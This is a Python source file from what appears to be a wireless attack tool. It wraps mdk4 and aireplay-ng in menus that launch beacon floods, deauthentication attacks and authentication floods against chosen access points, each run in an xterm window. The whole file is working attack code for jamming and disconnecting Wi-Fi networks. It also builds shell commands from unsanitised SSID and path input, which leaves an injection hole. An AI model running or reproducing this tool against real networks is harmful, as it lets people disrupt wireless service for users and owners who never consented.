from logging import err, ok, warn, info, input_field
import os
import sys
import subprocess
from colorama import Fore, Style, init
from utils import check_monitor_mode, start_monitor_mode
from scanner import run_airodump_scan, parse_airodump_csv, interactive_choose
from utils import set_channel

def start_beacon_flood(iface):
    """Launch mdk4 beacon flood inside xterm."""
    print(Fore.CYAN + Style.BRIGHT + "\n----- Beacon Flood Mode -----" + Style.RESET_ALL)
    print(f"{Fore.YELLOW}1. {Fore.RESET}Enter SSID manually")
    print(f"{Fore.YELLOW}2. {Fore.RESET}Select from scanned APs")
    print(f"{Fore.YELLOW}3. {Fore.RESET}Random SSIDs")
    print(f"{Fore.YELLOW}4. {Fore.RESET}Use SSIDs from a wordlist file")
    print()

    match input_field("Choose SSID option (1-4): "):
        case "1":
            ssid = input_field("Enter SSID to flood: ")
            ssid = f"-n '{ssid}'"
            mode = "Manual SSID"
        case "2":
            csv_file = run_airodump_scan(iface)
            aps = parse_airodump_csv(csv_file)  
            if not aps:
                err(f"No APs found in scan!")
                return
            _, _, _, ssid = interactive_choose(aps)
            ssid = f"-n '{ssid}'"
            mode = "Scanned AP SSID"
        case "3":
            ssid = ""
            mode = "Random SSIDs"
        case "4":
            wordlist_path = input_field("Enter path to wordlist file: ")
            if not os.path.isfile(wordlist_path):
                err(f"File not found: {wordlist_path}")
                return
            ssid = f"-f {wordlist_path}"
            mode = "Wordlist SSIDs"
        case _:
            err("[!] Invalid choice." + Style.RESET_ALL)
            return
    cmd_str = f"mdk4 {iface} b {ssid} -s 9999"

    #check and set monitor mode
    if not check_monitor_mode(iface):
        start_monitor_mode(iface)

    print(f"\n{Fore.CYAN}{Style.BRIGHT}----- Information -----{Style.NORMAL}")
    info(f"Mode             : {mode}")
    info(f"Target SSID      : {ssid if ssid else 'Random SSIDs'}")
    info(f"Interface        : {iface}")
    print()

    info(f"Attacking...")
    info(f"Press CTRL+C to stop the attack...")

    cmd = [
        "xterm",
        "-T", "Beacon Flood",
        "-geometry", "100x24-0-0",
        "-fg", "red",
        "-bg", "black",
        "-e", "bash", "-lc",
        cmd_str
    ]

    p = None
    try:
        p = subprocess.Popen(cmd)
        p.wait()
    except KeyboardInterrupt:
        ok(f"Attack stopped by user.")
    finally:
        if p:
            try:
                p.terminate()
            except:
                pass
        
        ok(f"Attack stopped.")

def start_deauth(bssid, channel, iface):
    """Launch mdk4 or aireplay-ng inside xterm based on user's choice."""

    print(Fore.CYAN + Style.BRIGHT + "\n----- Select Attack Method -----" + Style.RESET_ALL)
    print(f"{Fore.YELLOW}1. {Fore.RESET}aireplay-ng (classic, stable)")
    print(f"{Fore.YELLOW}2. {Fore.RESET}mdk4 (stronger, faster, more aggressive)")
    print(f"{Fore.YELLOW}3. {Fore.RESET}Authentication Flood (mdk4 only, may crash some APs)") 
    print()
    
    choice = input_field("Choose attack method (1-2): ")

    if choice == "1":
        tool = "aireplay"
        cmd_str = f"aireplay-ng -0 0 -a {bssid} {iface}"
    elif choice == "2":
        tool = "mdk4"
        cmd_str = f"mdk4 {iface} d -B {bssid} -s 9999"
    elif choice == "3":
        tool = "mdk4 (Auth Flood)"
        cmd_str = f"mdk4 {iface} a -a {bssid} -s 9999"
    else:
        err("[!] Invalid choice." + Style.RESET_ALL)
        return
    # Print information and set channel
    print(f"\n{Fore.CYAN}{Style.BRIGHT}----- Information -----{Style.NORMAL}")
    info(f"Using tool       : {tool}")
    info(f"Target BSSID     : {bssid}")
    info(f"Target Channel   : {channel}")
    info(f"Interface        : {iface}")
    print()

    info(f"Setting channel {channel} on interface {iface}...")
    set_channel(iface, channel)

    info(f"Attacking...")
    info(f"Press CTRL+C to stop the attack...")

    cmd = [
        "xterm",
        "-T", f"{tool} Deauth Attack",
        "-geometry", "100x24-0-0",
        "-fg", "red",
        "-bg", "black",
        "-e", "bash", "-lc",
        cmd_str
    ]

    p = None
    try:
        p = subprocess.Popen(cmd)
        p.wait()
    except KeyboardInterrupt:
        ok(f"Attack stopped by user.")
    finally:
        if p:
            try:
                p.terminate()
            except:
                pass
        
        ok(f"Attack stopped.")

